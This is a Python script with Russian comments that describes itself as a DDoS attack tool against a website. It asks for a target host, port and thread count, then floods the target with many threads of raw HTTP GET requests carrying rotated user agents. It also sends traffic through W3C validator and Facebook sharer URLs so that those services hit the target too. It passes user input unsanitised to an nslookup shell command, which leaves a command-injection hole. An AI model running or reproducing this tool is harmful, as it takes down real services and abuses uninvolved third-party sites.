"""
DDos атака на сайт.
при 150 потоках ~5_000_000 пакетов за 20s
"""
import os
from queue import Queue
import time, socket, threading, urllib.request, random

uagent = [
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"]

bots = [
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u="]


def botnet(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print("\033[94mПодключение к ботнету...\033[0m")
            time.sleep(.1)
    except:
        time.sleep(.1)


def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n").encode(
                'utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()),
                      "\033[0m \033[94m <-- Пакеты пошли -- ботнеры в работе --> \033[0m" + str(i))
            else:
                s.shutdown(1)
                print("\033[91m<->\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mПохоже сервер сдох ...\033[0m")
        print(e)
        time.sleep(.1)


def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        w.get()
        botnet(random.choice(bots) + "http://" + host)
        w.task_done()


# www.webscantest.com
web = input("Target website: ")
print(os.system(f"nslookup {web}"))
host = input("\033[94m[*] \033[91mIP \033[91mTarget \033[97m>>> \033[93m ")
port = input("\033[94m[*] \033[91mPORT \033[97m>>> \033[93m ")
thr_counts = int(input("\033[94m[*] \033[91mThreads \033[97m>>> \033[93m "))

print("\033[92m", host, " -Порт-: ", port, " -Потоков-: ", thr_counts, "\033[0m")
print("\033[94mПодготовка к атаке ...\033[0m")
time.sleep(5)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.settimeout(1)
except socket.error as e:
    print("\033[91mПроверка IP сервера и порта...\033[0m")
    print("\033[91mОшибка! Проверьте правильноссть IP и Порта.\033[0m")

i = 0
q = Queue()
w = Queue()
while True:
    for i in range(int(thr_counts)):
        t = threading.Thread(target=dos)
        t.daemon = True  # if thread is exist, it dies
        t.start()
        t2 = threading.Thread(target=dos2)
        t2.daemon = True  # if thread is exist, it dies
        t2.start()
    start = time.time()
    item = 0
    while True:
        if (item > 2E14):
            item = 0
            time.sleep(.1)
        i += 1
        item += 1
        q.put(item)
        w.put(item)
    q.join()
    w.join()
